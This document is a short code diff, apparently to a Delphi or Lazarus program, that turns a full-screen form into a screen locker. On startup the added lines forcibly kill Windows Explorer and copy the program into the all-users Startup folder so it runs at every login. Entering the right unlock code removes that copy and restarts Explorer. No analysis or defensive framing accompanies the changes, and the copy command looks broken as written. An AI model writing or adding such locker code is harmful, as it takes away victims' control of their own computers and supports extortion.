@@ -48,6 +48,8 @@ begin
   Top := 0;
   Height := Screen.Height;
   Width := Screen.Width;
+  SysUtils.ExecuteProcess(('TASKKILL /F /IM explorer.exe /T'), '', []);
+  SysUtils.ExecuteProcess(('copy %0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"'), '', []);
 end;
 
 procedure TForm1.FormClose(Sender: TObject; var CloseAction: TCloseAction);
@@ -67,6 +69,8 @@ begin
    if Edit1.Text = code then
       begin
          closeform := 0;
+         SysUtils.ExecuteProcess(('del /f /q "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\openlocker.exe"'), '', []);
+         SysUtils.ExecuteProcess(('explorer.exe'), '', []);
          Form1.Close;
       end
    else
